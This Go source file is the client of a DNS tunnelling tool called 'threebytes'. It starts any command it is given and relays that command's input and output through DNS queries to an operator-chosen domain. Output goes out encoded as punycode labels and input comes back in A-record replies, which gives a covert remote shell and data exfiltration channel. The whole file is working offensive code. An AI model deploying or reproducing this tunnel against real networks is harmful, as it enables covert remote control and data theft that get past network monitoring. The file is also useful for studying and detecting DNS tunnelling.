package main

/*
 * client.go
 * Client side of threebytes
 * By J. Stuart McMurray
 * Created 20181107
 * Last Modified 20181107
 */

import (
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"golang.org/x/net/idna"
)

const (
	minSleep = time.Nanosecond
	maxSleep = 2 * time.Second
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

/* client is the client side.  It starts the command in flag.Args(), and makes
DNS queries to the domain with the id for IO.  cbLen hex digits will be used to
get around DNS caching */
func client(id, domain string, offset, cbLen uint) {
	/* Make sure we have a command to run */
	if 0 == flag.NArg() {
		log.Fatalf("Please supply a command to execute")
	}

	/* Make sure we have a domain */
	if "" == domain {
		log.Fatalf("Please specify a domain (-domain)")
	}

	/* Pipes for output */
	pr, pw := io.Pipe()
	go proxyOutput(id, domain, offset, cbLen, pr)

	/* Fire off command */
	c := exec.Command(flag.Arg(0), flag.Args()[1:]...)
	c.Stdout = pw
	c.Stderr = pw
	stdin, err := c.StdinPipe()
	if nil != err {
		log.Fatalf("Unable to grab command's stdin: %v", err)
	}

	/* Start command */
	if err := c.Start(); nil != err {
		log.Fatalf("Unable to start command: %v", err)
	}
	log.Printf("Started command %q", flag.Args())

	/* Start polling for input */
	go pollInput(id, cbLen, domain, stdin)

	/* Wait for the command to exit */
	if err := c.Wait(); nil != err {
		log.Fatalf("Command error: %v", err)
	}
	log.Printf("Done.")
	os.Exit(0)
}

/* proxyOutput proxies bytes from in to domain with cbLen random hex digits and
with id id. */
func proxyOutput(id, domain string, offset, cbLen uint, pr io.Reader) {
	var (
		buf  = make([]byte, 3)
		rs   = make([]rune, 3)
		i, n int
		err  error
	)
	for {
		/* Grab a few bytes */
		n, err = pr.Read(buf)
		if nil != err {
			if io.EOF == err {
				return
			}
			log.Printf("Unable to read from command: %v", err)
			return
		}

		/* Encode it */
		for i = 0; i < n; i++ {
			rs[i] = rune(uint(buf[i]) + offset)
		}

		/* Send it off */
		i, err := idna.ToASCII(string(rs[:n]))
		if nil != err {
			log.Printf("Unable to encode %q: %v", string(rs), err)
			continue
		}
		query(i, id, cbLen, domain)

		/* Log the proxy */
		log.Printf("-> %q (%v)", string(buf[:n]), i)
	}
}

/* pollInput polls every so often for input from domain with id with cbLen
random bytes.  Returned bytes are sent to in */
func pollInput(id string, cbLen uint, domain string, in io.Writer) {
	st := (minSleep + maxSleep) / 2
	for {
		/* Poll for input */
		b := query("t", id, cbLen, domain)

		/* If we got something, write it and sleep less */
		if 0 != len(b) {
			/* Send the data */
			if _, err := in.Write(b); nil != err {
				log.Printf("Unable to proxy data to the command: %v", err)
				return
			}

			/* Log the proxied bytes */
			log.Printf("<- %q", string(b))

			/* Sleep less */
			st /= 2
			if minSleep > st {
				st = minSleep
			}
		} else {
			st *= 2
			if maxSleep < st {
				st = maxSleep
			}
		}

		/* Sleep and prepare to sleep more the next time */
		time.Sleep(st)
	}
}

var emptyslice = make([]byte, 0)

/* query sends a query with the payload, cbLen random hex digits, id,
and domain.  It returns an empty slice if no answers came back. */
func query(payload, id string, cbLen uint, domain string) []byte {
	/* Cachebusting */
	cb := fmt.Sprintf(
		"%016x%016x%016x%016x",
		rand.Uint64(),
		rand.Uint64(),
		rand.Uint64(),
		rand.Uint64(),
	)[:cbLen] /* Eh. */

	/* Query */
	q := fmt.Sprintf("%v.%v.%v.%v", payload, id, cb, domain)
	as, err := net.LookupIP(q)
	if nil != err {
		if strings.HasSuffix(err.Error(), ": no such host") {
			return emptyslice
		}
		log.Printf("Lookup error: %v", err)
		return emptyslice
	}
	if 0 == len(as) {
		return emptyslice
	}

	/* We should only have one A record */
	if 1 != len(as) {
		log.Printf("Got too many A records for %v: %v", q, as)
		return emptyslice
	}

	/* Return the single A record, less the leading byte and trailing
	null bytes. */
	a := as[0].To4()
	if nil == a {
		log.Printf("Only got a AAAA record for %v", q)
		return emptyslice
	}
	if '0' == a[1] {
		return emptyslice
	} else if '0' == a[2] {
		return a[1:2]
	} else if '0' == a[3] {
		return a[1:3]
	} else {
		return a[1:]
	}
}
